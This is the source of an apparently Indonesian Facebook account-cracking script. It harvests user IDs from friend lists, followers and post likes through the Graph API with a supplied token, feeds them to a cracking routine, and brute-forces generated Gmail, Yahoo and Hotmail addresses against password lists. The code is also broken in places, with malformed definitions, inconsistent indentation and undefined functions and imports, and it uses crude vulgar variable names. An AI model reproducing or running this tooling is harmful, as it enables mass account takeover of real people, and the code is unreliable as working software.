import requests,bs4,json,os,sys,random,datetime,time,re

import threading

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as parser

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

try:ugen = open('user.txt','r').read().splitlines()

except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

try:ugen2 = open('user2.txt','r').read().splitlines()

except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']



id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]



x = '\33[m' # DEFAULT

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

P = '\033[0;00m'

J = '\033[0;33m'

S = '\033[0;00m'

N = '\x1b[0m'

I ='\033[0;32m'

C ='\033[0;36m'

M ='\033[0;31m'

U ='\033[0;35m'

K ='\033[0;33m'

P='\033[00m'

h='\033[0;90m'

Q="\033[00m"

kk='\033[0;32m'

ff='\033[0;36m'

G='\033[0;36m'

p='\033[00m'

h='\033[0;90m'

Q="\033[00m"

I='\033[0;32m'

II='\033[0;36m'

m='\033[0;31m'

O ='\033[0;33m'

H='\033[0;33m'

b = '\033[0;36m'

war = "[•]"

B = random.choice([U,I,K,b,M])



dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}

dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def clear():
	os.system('clear')
def back():
	login()
def banner():
	print('''%s
	_______           ______   _______  _                 ______  
       (  ____ )|\     /|(  __  \ (  ___  )( \      |\     /|(  __  \ 
       | (    )|| )   ( || (  \  )| (   ) || (      ( \   / )| (  \  )
       | (____)|| |   | || |   ) || (___) || | _____ \ (_) / | |   ) |
       |     __)| |   | || |   | ||  ___  || |(_____) ) _ (  | |   | |
       | (\ (   | |   | || |   ) || (   ) || |       / ( ) \ | |   ) |
       | ) \ \__| (___) || (__/  )| )   ( || (____/\( /   \ )| (__/  )
       |/   \__/(_______)(______/ |/     \|(_______/|/     \|(______/ 
                                                               
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Rudal-XD
 [\x1b[1;96m+%s] Github   : -
 [\x1b[1;96m+%s] Facebook : gaming bubrah
───────────────────────────────────────────────────────\n'''%(N,N,N,N))

#login

balmond = O+"["+J+"•"+O+"]"

def login():
	banner()
	sky = '# MASUKAN TOKEN FACEBOOK'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'•'+x+'] Token Fb : ')
	akun=open('.token.x','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '# nice Login berhasil'
		suu = mark(sue, style='green')
		sol().print(suu, style='cyan')
		time.sleep(2)
		menu()
	except KeyError:
		sue = '# Login Gagal, Cek token'
		suu = mark(sue, style='red')
		sol().print(suu, style='cyan')
		time.sleep(2)
		login()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		menu()
	
class menu:

	def__init__(self): 
		self.uid = []
	def menu(self):
		try:
			toke = open('token.x','r').read()
		except IOError:
			print(' [%s+%s] Kamu belum login'%(M,N));login().__login__()
		try:
			r = requests.get('https://graph.facebook.com/me?access_token=%s'%(toke)).json()['name']
		except KeyError:
			print(' [%s!%s] Login gagal ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);login().__login__()
		except requests.exceptions.ConnectionError:
			exit(' [%s!%s] cek koneksi'%(M,N))
		try:
			akss = open('token.x','r').read()
		except IOError:
			akss = '-'
		banner()
		IP = requests.get('https://api.ipify.org').text
		jalan(' %s[ %sselamat Datang %s%s ]'%(N,H,r,N))
		print(' %s[%s•%s] Alamat IP kamu saat ini : %s'%(H,O,H,IP))
		print(' %s[%s•%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		print(' %s[%s0%s] crack dari daftar teman'%(N,O,N))
		print(' %s[%s1%s] crack dari akun publik'%(N,O,N))
		print(' %s[%s2%s] crack dari akun massal'%(N,O,N))
		print(' %s[%s3%s] crack dari postingan'%(N,O,N))
		print(' %s[%s4%s] crack dari likes post'%(N,O,N))
		print(' %s[%s5%s] crack dari followers'%(N,O,N))
		print(' %s[%s6%s] cek opsi akun chekpoint'%(N,O,N))
		print(' %s[%s7%s] cek hasil crack ok,cp'%(N,O,N))
		print(' %s[%s8%s] seting User-Agent'%(N,O,N))
		print(' %s[%s9%s] crack email'%(N,O,N))
		print(' %s[%sG%s] Get data² facebook'%(N,O,N))
		print(' %s[%sK%s] Lapor bug script'%(N,O,N))
		print(' %s[%sA%s] Keluar, hapus token'%(N,O,N))
		self.pilih()

def pilih(self):

		print(' %s'%(N))

		usna = input(' %s[%s+%s] choose : '%(N,O,N))

		if usna in ['']:

			print(' %s'%(N))

			print(' %s[%s!%s] Jangan kosong mas'%(N,M,N));time.sleep(2);menu().main()

		elif usna in ['0','00']:

			try:

				token = open('token.x','r').read()

			except IOError:

				os.system('rm -rf token.x')

				exit(' %s[%s!%s] Cek token kamu'%(N,M,N))

			try:

				lmt = input(' %s[%s+%s] Limit id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/me?fields=friends.limit(%s)&access_token=%s'%(lmt,token))

				z = json.loads(r.text)

				id = []

				for w in z['friends']['data']:

					id.append(z['id'] + '<=>' + w['name'])

			except KeyError:

				print(' %s[%s!%s] Akun anda tidak publik...'%(N,M,N));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)
		elif usna in ['1','01']:

			try:

				token = open('token.x','r').read()

			except IOError:

				os.system('rm -rf token.x')

				exit(' %s[%s!%s] Coba jalankan ulang !'%(N,M,N))

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,token))

				e = json.loads(r.text)

				id = []

				for u in e['friends']['data']:

					id.append(u['id'] + '<=>' + u['name'])

			except KeyError:

				print(' %s'%(N))

				jalan(' %s[%s•%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['2','02']:

			token = open('token.x','r').read()

			try:

				pler = int(input(' %s[%s•%s] Mau crack berapa id : '%(N,O,N)))

			except:pler = 1

			for ikeh in range(pler):

				ikeh += 1

				try:

					print(' %s'%(N))

					idt = input(' %s[%s•%s] Masukan id yang ke %s : '%(N,O,N,ikeh))

					r = requests.get(f'https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name)&access_token={token}')

					z = json.loads(r.text)

					id = []

					for a in z['friends']['data']:

						id.append(a['id'] + '<=>' + a['name'])

				except KeyError:

					pass

				else:

					pass

			crack().fbeh(id)

		elif usna in ['3','03']:

			pepek = open('token.x','r').read()

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,pepek))

				z = json.loads(r.text)

				id = []

				for a in z['data']:

					id.append(a['id'] + '<=>' + a['name'])

			except KeyError:

				print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(3);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['4','04']:

			memek = open('token.x','r').read()

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,memek))

				z = json.loads(r.text)

				id = []

				for e in z['data']: # MEMEK

					id.append(e['id'] + '<=>' + e['name'])

			except KeyError:

				print(' %s[%s!%s] ID %s Tidak di temukan'%(N,O,N,idt));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['5','05']:

			khamdihiXDX = open('token.x','r').read()

			try:

				print(' %s'%(N))

				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))

				r = requests.get('https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s'%(idt,khamdihiXDX))

				z = json.loads(r.text)

				id = []

				for w in z['data']:

					id.append(w['id'] + '<=>' + w['name'])

			except KeyError:

				print(' %s[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(2);menu().main()

			else:

				crack().fbeh(id)

		elif usna in ['6','06']:

			print(' %s'%(N))

			print(' %s[%s•%s] Masukan -> Cp.txt sebagai file'%(N,O,N))

			files = input(' %s[%s•%s] Masukan files : '%(N,O,N))

			try:

				buka_baju = open(files, "r").readlines()

			except IOError:

				exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(N,M,N,H,files,N))
            for memek in buka_baju:

				kontol = memek.replace("\n","")

				titid  = kontol.split("|")

				print("\n • Account : "+(kontol.replace(" + ","")))

				try:

					khamdihi(titid[0].replace(" + ",""), titid[1])

				except requests.exceptions.ConnectionError:

					pass

			exit("\n%s [%s!%s] Done Ya Anjing"%(N,M,N))

		elif usna in ['7','07']:

			print(' %s '%(N))

			print(' %s [%s1%s] Cek hasil ok'%(N,O,N))

			print(' %s [%s2%s] Cek hasil cp'%(N,O,N))

			print(' %s [%s0%s] Kembali'%(N,O,N))

			print(' %s '%(N))

			hsl = input(' %s [%s•%s] choose : '%(N,O,N))

			if hsl in ['1','01']:

				hasil_ok = open('Ok.txt','r').read()

				if len(hasil_ok) != 0:

					print('\n')

					print('%s[ %shasil okeh %s]'%(N,H,N))

					os.system('cat Ok.txt');exit()

				else:

					print(' %s [%s!%s] Kamu gak dapet hasil okeh :('%(N,O,N))

			elif hsl in ['2','02']:

				hasil_cp = open('Cp.txt','r').read()

				if len(hasil_cp) != 0:

					print('\n')

					print(' %s[ %shasil cepeh kamu %s]'%(N,K,N))

					os.system('cat Cp.txt');exit()

			else:

				menu().main()

		elif usna in ['8','08']:

			print(' %s '%(N))

			print(' %s [%s1%s] Cek user agent default'%(N,O,N))

			print(' %s [%s2%s] Ganti user agent '%(N,O,N))

			print(' %s [%s0%s] Keluar'%(N,O,N))

			print(' %s '%(N))

			pwk = input(' %s [%s+%s] choose : '%(N,O,N))

			if pwk in ['1','01']:

				fika = open('user.txt','r').read()

				print(' %s [%s!%s] User agent sekarang : %s'%(N,O,N,fika))

				time.sleep(4);menu().main()

			elif pwk in ['2','02']:

				ua = input(' %s [%s+%s] Masukan ua baru : '%(N,O,N))

				try:

					nunu = open('user.txt','w')

					nunu.write(ua)

					nunu.close()

					print(' %s [%s!%s] Sukses mengganti ua : %s'%(N,O,N,ua));time.sleep(4);menu().main()

				except:pass

			else:

				menu().main()

		elif usna in ['9','09']:

			data = []

			print(' %s '%(N))

			nama = input(' %s [%s+%s] Target nama : '%(N,O,N))

			print(' %s [%s+%s] Contoh domain : Jika ingin crack Gmail ketik : G '%(N,O,N))

			domain = input(' %s [%s+%s] Masukan domain [G]mail, [Y]ahoo, [H]otmail : '%(N,O,N)).lower().strip()

			list = {

				'g':'@gmail.com',

				'y':'@yahoo.com',

				'h':'@hotmail.com'

			}

			jml = int(input(' %s [%s+%s] Jumlah target : '%(N,O,N)))

			pwx = input(' %s [%s+%s] Masukan password : '%(N,O,N)).split(',')

			print(' %s [%s+%s] Crack sedang di mulai'%(N,O,N))

			[data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in pwx]}) for e in range(1,jml+1)]

			with khamdihiXD(max_workers=15) as th:

				{th.submit(brute, user['user'], user['pw']): user for user in data}

			exit('%s [%s!%s] Crack telah selezai'%(N,O,N))

		elif usna in ['G','g']:

			target()

		elif usna in ['K','k']:

			nom_wa ='+62895386194665'

			text = input(' %s [%s!%s] Apa yang error ketik di sini : '%(N,O,N))

			url_wa = ("https://api.whatsapp.com/send?phone="+nom_wa+"&text="+text)
            subprocess.check_output(["am", "start", url_wa])

			exit()

		elif usna in ['a','A']:

			os.system('rm -rf token.x');exit()

		elif usna in ['U','u']:

			nom_wa ='+62895386194665'

			kata = input(' %s [%s!%s] Masukan pesan kamu ke admin : %s'%(N,O,N,H))

			url_wa = ("https://api.whatsapp.com/+6285929340724?phone="+nom_wa+"&text="+kata)

			subprocess.check_output(["am", "start", url_wa])

			exit()

		else:

			print('%s  [%s+%s] Wrong input'%(N,M,N));time.sleep(2);menu().main()


